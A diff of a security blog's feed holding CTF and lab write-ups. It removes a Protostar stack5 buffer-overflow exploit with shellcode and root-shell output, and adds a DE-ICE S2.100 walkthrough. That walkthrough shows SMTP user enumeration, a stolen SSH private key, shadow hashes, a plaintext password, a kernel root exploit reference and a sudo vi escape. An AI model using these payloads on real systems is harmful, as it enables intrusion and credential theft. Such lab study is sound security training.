-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~/fixenv$ ruby -e 'sc="\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"; print sc + "\x90" * (76 - sc.length) + [0xbffff820].pack("V") ' | ./r.sh /opt/protostar/bin/stack5 
-</span><span class='line'>user@protostar:~/fixenv$</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The shell is executed, however it receives EOF. For this purposes, we can keep it alive with <code>cat</code> command:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~/fixenv$ (ruby -e 'sc="\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"; print sc + "\x90" * (76 - sc.length) + [0xbffff820].pack("V") '; cat -) | ./r.sh /opt/protostar/bin/stack5
-</span><span class='line'>
-</span><span class='line'>id
-</span><span class='line'>uid=0(root) gid=1001(user) groups=0(root),1001(user)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Sometimes a more convenient solution could be storing shellcode in environment:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~/fixenv$ export EGG=$(ruby -e 'print "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
-</span><span class='line'>
-</span><span class='line'>user@protostar:~/fixenv$ ./r.sh getvar EGG
-</span><span class='line'>0xbfffff60  \x60\xff\xff\xbf  (EGG)
-</span><span class='line'>
-</span><span class='line'>user@protostar:~/fixenv$ ruby -e 'print "A" * 76 + [0xbfffff60].pack("V")' | ./r.sh /opt/protostar/bin/stack5
-</span><span class='line'>user@protostar:~/fixenv$ 
-</span><span class='line'>
-</span><span class='line'>user@protostar:~/fixenv$ (ruby -e 'print "A" * 76 + [0xbfffff60].pack("V")' ; cat) | ./r.sh /opt/protostar/bin/stack5
-</span><span class='line'>
-</span><span class='line'>id
-</span><span class='line'>uid=0(root) gid=1001(user) groups=0(root),1001(user)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We do not need to use <code>r.sh</code> again - the EGG address could be easily calculated (albeit it&rsquo;s different, because <code>fixenv</code> clears our environment):</p>
-
-<figure class='code'><figcaption><span>getenv.c </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
-</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: %s &lt;environment var&gt; &lt;target program name&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
-</span><span class='line'>        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span><span class='line'>        <span class="cm">/* Get environment variable location */</span>
-</span><span class='line'>        <span class="n">ptr</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
-</span><span class='line'>        <span class="cm">/* Adjust for program name */</span>
-</span><span class='line'>        <span class="n">ptr</span> <span class="o">+=</span> <span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">-</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span> <span class="o">*</span> <span class="mi">2</span><span class="p">;</span>
-</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s will be at %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">ptr</span><span class="p">);</span>
-</span><span class='line'>    <span class="p">}</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~/fixenv$ gcc getenv.c -o getenv
-</span><span class='line'>
-</span><span class='line'>user@protostar:~/fixenv$ ./getenv EGG /opt/protostar/bin/stack5
-</span><span class='line'>EGG will be at 0xbffff9b0
-</span><span class='line'>
-</span><span class='line'>user@protostar:~/fixenv$ (ruby -e 'print "A" * 76 + [0xbffff9b0].pack("V")' ; cat) | /opt/protostar/bin/stack5
-</span><span class='line'>
-</span><span class='line'>id
-</span><span class='line'>uid=0(root) gid=1001(user) groups=0(root),1001(user)</span></code></pre></td></tr></table></div></figure>
-
-]]></content>
-  </entry>
   
   <entry>
     <title type="html"><![CDATA[IA-32 Linux Shellcode Basics 2]]></title>
@@ -1137,8 +469,8 @@ NULL bytes.</p>
 
 
 <p>The segfault is normal and it&rsquo;s because we are trying to overwrite the code
-segment at the line <code>mov BYTE PTR [ebx+0x7],cl</code>. Because our shellcode will be
-loaded on stack, that doesn&rsquo;t mean any complication.</p>
+segment at the line <code>mov BYTE PTR [ebx+0x7],cl</code>. However, our shellcode will be
+loaded on stack and that doesn&rsquo;t mean any complication.</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -8103,7 +7435,7 @@ predictable for dirb.</p>
 
 <p>There is nothing interesting for us except the sysadmin account.</p>
 
-<p>Web page mentions <a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#x3a;&#99;&#117;&#x73;&#x74;&#111;&#109;&#101;&#x72;&#115;&#101;&#114;&#118;&#105;&#99;&#101;&#97;&#100;&#x6d;&#105;&#110;&#x40;&#110;&#111;&#x73;&#101;&#99;&#x62;&#97;&#110;&#107;&#x2e;&#99;&#111;&#109;">&#99;&#x75;&#115;&#116;&#111;&#x6d;&#101;&#114;&#x73;&#101;&#x72;&#x76;&#x69;&#x63;&#x65;&#x61;&#x64;&#109;&#105;&#x6e;&#x40;&#110;&#111;&#115;&#101;&#99;&#98;&#97;&#110;&#107;&#46;&#99;&#x6f;&#x6d;</a> email address. After a
+<p>Web page mentions <a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#111;&#x3a;&#x63;&#x75;&#x73;&#x74;&#x6f;&#x6d;&#x65;&#x72;&#115;&#x65;&#x72;&#118;&#105;&#x63;&#x65;&#97;&#x64;&#x6d;&#x69;&#110;&#64;&#x6e;&#111;&#x73;&#101;&#99;&#98;&#x61;&#x6e;&#x6b;&#x2e;&#99;&#111;&#109;">&#99;&#x75;&#115;&#x74;&#111;&#109;&#101;&#x72;&#x73;&#101;&#x72;&#118;&#105;&#99;&#x65;&#97;&#100;&#x6d;&#x69;&#110;&#64;&#110;&#111;&#115;&#x65;&#99;&#x62;&#97;&#110;&#107;&#x2e;&#99;&#x6f;&#x6d;</a> email address. After a
 little trying, we found out the user account that exists:</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
@@ -12506,6 +11838,414 @@ to enable them.</p>
 </span><span class='line'>
 </span><span class='line'>Key Found in file: dcbe2a56e8cdea6d17495f6648329ee2-4679
 </span><span class='line'>Execute: ssh -lobama -p22 -i /tmp/rsa/2048/dcbe2a56e8cdea6d17495f6648329ee2-4679 192.168.0.25</span></code></pre></td></tr></table></div></figure>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[DE-ICE-S2.100]]></title>
+    <link href="http://73696e65.github.io/blog/2015/05/10/de-ice-s2-dot-100/"/>
+    <updated>2015-05-10T11:40:38+02:00</updated>
+    <id>http://73696e65.github.io/blog/2015/05/10/de-ice-s2-dot-100</id>
+    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/de-ice-s2100,13/">De-ICE: S2.100</a></p>
+
+<p>Nmap output:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PORT    STATE  SERVICE  VERSION
+</span><span class='line'>21/tcp  open   ftp      vsftpd 2.0.4
+</span><span class='line'>22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)
+</span><span class='line'>25/tcp  open   smtp     Sendmail 8.13.7/8.13.7
+</span><span class='line'>80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
+</span><span class='line'>110/tcp open   pop3     Openwall popa3d
+</span><span class='line'>143/tcp open   imap     UW imapd 2004.357</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We found out that there is another IP address on the same network:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Nmap scan report for 192.168.2.101
+</span><span class='line'>Host is up (0.00038s latency).
+</span><span class='line'>Not shown: 999 filtered ports
+</span><span class='line'>PORT   STATE SERVICE
+</span><span class='line'>80/tcp open  http
+</span><span class='line'>MAC Address: 00:0C:29:53:2F:A3 (VMware)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Enumerating SMTP users, we get:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# for i in $(cat /usr/share/ncrack/default.usr); do echo $i; echo -e "\nehlo lol\nmail from:$i@slax.example.net\nrcpt to:$i\nquit\n" | nc 192.168.2.100 25; done  | grep -i 'Recipient ok' 
+</span><span class='line'>250 2.1.5 root... Recipient ok
+</span><span class='line'>250 2.1.5 operator... Recipient ok
+</span><span class='line'>250 2.1.5 manager... Recipient ok
+</span><span class='line'>250 2.1.5 Manager... Recipient ok
+</span><span class='line'>250 2.1.5 adm... Recipient ok
+</span><span class='line'>250 2.1.5 lp... Recipient ok
+</span><span class='line'>250 2.1.5 MAIL... Recipient ok
+</span><span class='line'>250 2.1.5 system... Recipient ok
+</span><span class='line'>250 2.1.5 MANAGER... Recipient ok
+</span><span class='line'>250 2.1.5 OPERATOR... Recipient ok
+</span><span class='line'>250 2.1.5 halt... Recipient ok
+</span><span class='line'>250 2.1.5 Root... Recipient ok
+</span><span class='line'>250 2.1.5 SYSTEM... Recipient ok
+</span><span class='line'>250 2.1.5 ftp... Recipient ok
+</span><span class='line'>250 2.1.5 mail... Recipient ok
+</span><span class='line'>250 2.1.5 toor... Recipient ok
+</span><span class='line'>250 2.1.5 ROOT... Recipient ok
+</span><span class='line'>250 2.1.5 shutdown... Recipient ok
+</span><span class='line'>250 2.1.5 bin... Recipient ok
+</span><span class='line'>250 2.1.5 POSTMASTER... Recipient ok
+</span><span class='line'>250 2.1.5 nobody... Recipient ok
+</span><span class='line'>250 2.1.5 games... Recipient ok
+</span><span class='line'>250 2.1.5 postmaster... Recipient ok
+</span><span class='line'>250 2.1.5 NEWS... Recipient ok
+</span><span class='line'>250 2.1.5 sync... Recipient ok
+</span><span class='line'>250 2.1.5 INGRES... Recipient ok
+</span><span class='line'>250 2.1.5 daemon... Recipient ok
+</span><span class='line'>250 2.1.5 uucp... Recipient ok
+</span><span class='line'>250 2.1.5 Operator... Recipient ok
+</span><span class='line'>250 2.1.5 webmaster... Recipient ok
+</span><span class='line'>250 2.1.5 news... Recipient ok</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We used CEWL to create wordlist (userlist.txt) to reveal another user accounts.
+Before we use this command, it&rsquo;s good to check if the disk is not full for
+proper SMTP functionality.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:# for i in $(cat ~/vulnhub/DE-ICE-S2.100/userlist.txt); do echo $i; echo -e "\nehlo lol\nmail from:$i@slax.example.net\nrcpt to:$i\nquit\n" | nc 192.168.2.100 25; done  | grep -i 'Recipient ok'
+</span><span class='line'>250 2.1.5 havisham... Recipient ok
+</span><span class='line'>250 2.1.5 magwitch... Recipient ok
+</span><span class='line'>250 2.1.5 pirrip... Recipient ok</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Again, this could be automatized using smtp-user-enum script:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:# smtp-user-enum -M RCPT -f root@slax.example.net -U userlist.txt -t 192.168.2.100</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Dirb found the following URLs:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.2.101/~havisham/
+</span><span class='line'>http://192.168.2.101/~magwich/
+</span><span class='line'>http://192.168.2.101/~pirrip/
+</span><span class='line'>http://192.168.2.101/~pirrip/.ssh/</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We download the private key of pirrip user and log in:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>-----BEGIN RSA PRIVATE KEY-----
+</span><span class='line'>MIIEoQIBAAKCAQEA1pfb/CVukUw4Xe67YLEZzVHWNax0zJjI1CfcsoEGylmmtlA6
+</span><span class='line'>iXHi41nLshzXu9n536JfM9LFAWGqefBVX7Bzd/fC4+jHS3q89IK9FP7gFPwEmlNH
+</span><span class='line'>CwPX0ADxDFyB1lJOFffJ9gVw3VgHCaCPgS70UqJD0hZFDMSDMoBa91PylFQR0m58
+</span><span class='line'>nMq8DsGRbeC5hTdpLXKfBuW8v/lFuNEWVWNcZDie82aiJg8WRUUIrzeGZSR3+cG1
+</span><span class='line'>hi6za67VIi+ce8fFuBvIgaEpvJ0JSIX7zPLUV10ezW1NQRNplKSam3TIYI3+Ywuh
+</span><span class='line'>lcgpEyliHYReN6v91+um2c6LNy9y/vx2Akci5QIBIwKCAQEAvhF5s3GcchBPLqA/
+</span><span class='line'>kCfVBk/MW2zcerM1iLWXlsoNVCOFB+Co4CMKyV4pcd8IOKsfJSlqQ9fwUa5GiUKU
+</span><span class='line'>wne2urbf0S1CzdMcY4m9al4W7gPJkACeAnEeO+OTq9zoBvhxDCSc79ju7+7hqXD0
+</span><span class='line'>IfZjXyIBjjD7VHOKJWpfMtVTMunBCMqoAMa2veuN6LgDJweQNi7kon4qcj4SghGI
+</span><span class='line'>bdBv/Cnk7PMkG+DhafTRWyXGMWFpTHV4BNKv0i+k4lVV1oP9nJnh9jglY4EkD9LD
+</span><span class='line'>0Yt2QZt+XMTlxScsjcBpVGc9m4ZrgmRZGV0PTyMuWJtURkDBYPizkiPjjSZfUbyZ
+</span><span class='line'>y9QECwKBgQDsR9wLzrQbJIaOX8dG4rEt8pQHdYK7KCM8Bcq45iKKPzeLxchguM3o
+</span><span class='line'>+y9nRz5x8RWXWZUMl7PldoqwmrKh6WVCrdJ7mghPTYx3Djhcaf8q5XFTUhZH4xhB
+</span><span class='line'>72g1H6+JCECUjAFfjoSTOEswCFKYssgYA22x3fvLGg3S8f0UjjE1xQKBgQDogKVg
+</span><span class='line'>iyXCE833evccfrd/otsyVcxNincunAtYDAsqa2ZrjXL3oFwNwfC1CVKPhqDlnG46
+</span><span class='line'>M1tiSeYXygPbuPbHzRdu0ZuG7jRxxVdndl52gq/Zt8MKNRD9mdbFRcRMXmMRfaE4
+</span><span class='line'>RXdry9eB4rPywfWgJPGNVtOFZP6PRVv+IpoqoQKBgBRArHYKZzWGybRunA1j400U
+</span><span class='line'>ytwRYvoZYhsWcHY/nI+Bwu65Lm6wwTE6GgGJw4Yb+olQ0kLoboFh7qFsWHRHNJCv
+</span><span class='line'>0DZ66sT4BLm/Y+qp/+275SRmHyq7sZ9AaASNr/XNgeDYzOru9Wu0XjdRK6awPQlf
+</span><span class='line'>YSyAvc+UhNeRFbFOBDfPAoGAVlurI9vpc/i6N1mO+/SNTKo0KKOGZfGZ+16H3t/m
+</span><span class='line'>496/pEp7KMaIl2VKxuY0m7WpedsEXsKeSRQiQ1mpqWH1QuXG4AS2HCyXIvGG3Uk5
+</span><span class='line'>B3JekrH3/HocQO//UJZBmLVX/y6pmI7UlcC9wodnaMuzAPfHbwL+G5qKb7qtI+D3
+</span><span class='line'>busCgYATj4y+8msxNWRRNbHWAV7G0OurPDeZJ8F8NDLpM22X8fM08wgGRwkW4fpa
+</span><span class='line'>A+J8tN2ibiDqw29W6Rc1/4evAPbo3GR932W/ELOTOpP2yquiwoSxPG+HCLHmDITr
+</span><span class='line'>1qGHJRSOiFzo99iS5aQRhUvdl3M0lz1Cort7hjRKUkSWcT02Rw==
+</span><span class='line'>-----END RSA PRIVATE KEY-----</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# chmod 600 pirrip-rsa.ssh
+</span><span class='line'>root@kali:~# ssh -l pirrip 192.168.2.100 -i pirrip-rsa.ssh
+</span><span class='line'>Linux 2.6.16.
+</span><span class='line'>pirrip@slax:~$
+</span><span class='line'>
+</span><span class='line'>pirrip@slax:/etc$ cat /etc/passwd
+</span><span class='line'>root:x:0:0::/root:/bin/bash
+</span><span class='line'>bin:x:1:1:bin:/bin:
+</span><span class='line'>daemon:x:2:2:daemon:/sbin:
+</span><span class='line'>adm:x:3:4:adm:/var/log:
+</span><span class='line'>lp:x:4:7:lp:/var/spool/lpd:
+</span><span class='line'>sync:x:5:0:sync:/sbin:/bin/sync
+</span><span class='line'>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+</span><span class='line'>halt:x:7:0:halt:/sbin:/sbin/halt
+</span><span class='line'>mail:x:8:12:mail:/:
+</span><span class='line'>news:x:9:13:news:/usr/lib/news:
+</span><span class='line'>uucp:x:10:14:uucp:/var/spool/uucppublic:
+</span><span class='line'>operator:x:11:0:operator:/root:/bin/bash
+</span><span class='line'>games:x:12:100:games:/usr/games:
+</span><span class='line'>ftp:x:14:50::/home/ftp:
+</span><span class='line'>smmsp:x:25:25:smmsp:/var/spool/clientmqueue:
+</span><span class='line'>mysql:x:27:27:MySQL:/var/lib/mysql:/bin/bash
+</span><span class='line'>rpc:x:32:32:RPC portmap user:/:/bin/false
+</span><span class='line'>sshd:x:33:33:sshd:/:
+</span><span class='line'>gdm:x:42:42:GDM:/var/state/gdm:/bin/bash
+</span><span class='line'>pop:x:90:90:POP:/:
+</span><span class='line'>nobody:x:99:99:nobody:/:
+</span><span class='line'>pirrip:x:1000:10:Philip Pirrip:/home/pirrip:/bin/bash
+</span><span class='line'>magwitch:x:1001:100:Abel Magwitch:/home/magwitch:/bin/bash
+</span><span class='line'>havisham:x:1002:100:Estella Havisham:/home/havisham:/bin/bash</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The root accound can be obtained using exploit from Kali:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/usr/share/exploitdb# 
+</span><span class='line'>
+</span><span class='line'>  * hoagie_udp_sendmsg.c
+</span><span class='line'>  * LOCAL LINUX KERNEL ROOT EXPLOIT (&lt; 2.6.19) - CVE-2009-2698</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sh-3.1# cat /etc/shadow
+</span><span class='line'>root:$1$/Ta1Q0lT$CSY9sjWR33Re2h5ohV4MX/:13882:0:::::
+</span><span class='line'>bin:*:9797:0:::::
+</span><span class='line'>daemon:*:9797:0:::::
+</span><span class='line'>adm:*:9797:0:::::
+</span><span class='line'>lp:*:9797:0:::::
+</span><span class='line'>sync:*:9797:0:::::
+</span><span class='line'>shutdown:*:9797:0:::::
+</span><span class='line'>halt:*:9797:0:::::
+</span><span class='line'>mail:*:9797:0:::::
+</span><span class='line'>news:*:9797:0:::::
+</span><span class='line'>uucp:*:9797:0:::::
+</span><span class='line'>operator:*:9797:0:::::
+</span><span class='line'>games:*:9797:0:::::
+</span><span class='line'>ftp:*:9797:0:::::
+</span><span class='line'>smmsp:*:9797:0:::::
+</span><span class='line'>mysql:*:9797:0:::::
+</span><span class='line'>rpc:*:9797:0:::::
+</span><span class='line'>sshd:*:9797:0:::::
+</span><span class='line'>gdm:*:9797:0:::::
+</span><span class='line'>pop:*:9797:0:::::
+</span><span class='line'>nobody:*:9797:0:::::
+</span><span class='line'>pirrip:$1$KEj04HbT$ZTn.iEtQHcLQc6MjrG/Ig/:13882:0:99999:7:::
+</span><span class='line'>magwitch:$1$qG7/dIbT$HtTD946DE3ITkbrCINQvJ0:13882:0:99999:7:::
+</span><span class='line'>havisham:$1$qbY1hmdT$sVZn89wKvmLn0wP2JnZay1:13882:0:99999:7:::
+</span><span class='line'>
+</span><span class='line'>sh-3.1# cat /var/access/.htpasswd
+</span><span class='line'>aadams:bS.PQ9hVYEqrQ</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There is another way to get root account. At first we find out the password for
+pirrip user:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>pirrip@slax:/var/spool/mail$ cat pirrip
+</span><span class='line'>
+</span><span class='line'>E-Mail: pirrip@slax.example.net
+</span><span class='line'>Password: 0l1v3rTw1st</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>pirrip@slax:/var/spool/mail$ sudo -l
+</span><span class='line'>pirrip@slax:/var/spool/mail$ sudo vi
+</span><span class='line'>:!/bin/bash</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Finally, in /root/.save we obtain the following data:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
